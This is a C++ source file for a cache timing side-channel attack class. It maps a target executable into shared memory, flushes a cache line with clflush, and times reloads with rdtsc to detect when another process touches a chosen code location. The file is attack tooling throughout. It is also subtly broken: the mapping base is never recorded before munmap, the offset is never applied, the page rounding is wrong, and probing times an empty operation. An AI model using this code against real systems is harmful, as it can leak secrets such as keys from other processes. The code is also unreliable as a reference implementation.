#include "cache_timing_attack.hpp"

using CTA = CacheTimingAttack;

struct CTA::impl{

	std::string executable;
	unsigned int offset=0;

	int fd=0;
	void* mmap_base_address=0;
	size_t map_size=0;

	void* addr=nullptr;
};

void CTA::operation() const {}

std::tuple<int, size_t> CTA::open_executable(const char* executable) const {

	int fd = open(executable, O_RDONLY);
	size_t size = lseek(fd, 0L, SEEK_END);

	if( !size ) throw std::ios_base::failure("Couldn't open executable");
	return { fd, size };
}

std::tuple<void*, size_t> CTA::mmap_file(int fd, size_t map_size) const {


	unsigned int page_size = sysconf(_SC_PAGE_SIZE);
	if( map_size & page_size ){

		map_size |= page_size;
		map_size++;
	}

	void* base_address = mmap(nullptr, map_size, PROT_READ, MAP_SHARED, fd, 0);

	return { base_address, map_size };
}

unsigned int CTA::time() const {

	uint64_t a,d;

	asm volatile(
			"mfence \n"
			"rdtsc \n"
			"mfence \n"
			: "=a"(a), "=d"(d)
			: 
			:
		);

	//rdtsc is a x86 instruction. To write the 64 bit
	//timestamp, it writes the first MSR 32 bits in
	//EDX and the other 32 in EAX.

	return (d<<32) | a;
}

void CTA::flush() const {

	asm volatile("clflush (%0)\n"
			:
			: "r"(pimpl->addr)
			:
		);
}

void CTA::access() const {

	asm volatile("movq (%0), %%rax\n"
			:
			: "r" (pimpl->addr)
			: "rax");
}

unsigned int CTA::probe() const {

	flush();
	sched_yield(); //move this process to last in processr queue
	return time_operation();
}

unsigned int CTA::time_operation() const {

	unsigned int begin = time();
	operation();
	return time() - begin;
}

bool CTA::was_accessed() const {

	unsigned int t = probe();

	return hit_begin <= t && t <= hit_end;
}

bool CTA::was_accessed(unsigned int timestamp) const {

	return hit_begin <= timestamp && timestamp <= hit_end;
}

unsigned int CTA::wait_for_access() const {

	unsigned int time=0;

	do{
	
		time=probe();

	}while( !was_accessed(time) );

	return time;
}

void CTA::call_when_offset_is_accessed(std::function<bool (unsigned int n_calls, void* addr)> func) const {
	
	unsigned int time = 0;

	do{
		time = wait_for_access();
		
	}while( func(time, pimpl->addr) );
}

CTA::CacheTimingAttack(const char* executable, unsigned int offset) :
	pimpl(std::make_unique<CTA::impl>()){

	pimpl->executable = executable;
	pimpl->offset = offset;

	auto [ fd, size ] = open_executable(executable);
	auto [ addr, map_size ] = mmap_file(fd, size);

	pimpl->map_size = map_size;
	pimpl->fd = fd;

	pimpl->addr = addr;
}

CTA::~CacheTimingAttack(){

	close(pimpl->fd);	
	munmap(pimpl->mmap_base_address, pimpl->map_size);
}

CTA::CacheTimingAttack(const CTA& other) :
	pimpl(std::make_unique<CTA::impl>(*other.pimpl)){

		hit_begin = other.hit_begin;
		hit_end = other.hit_end;
}

CTA& CTA::operator=(const CTA& other) {

	*pimpl = *other.pimpl;

	hit_begin = other.hit_begin;
	hit_end = other.hit_end;

	return *this;
}
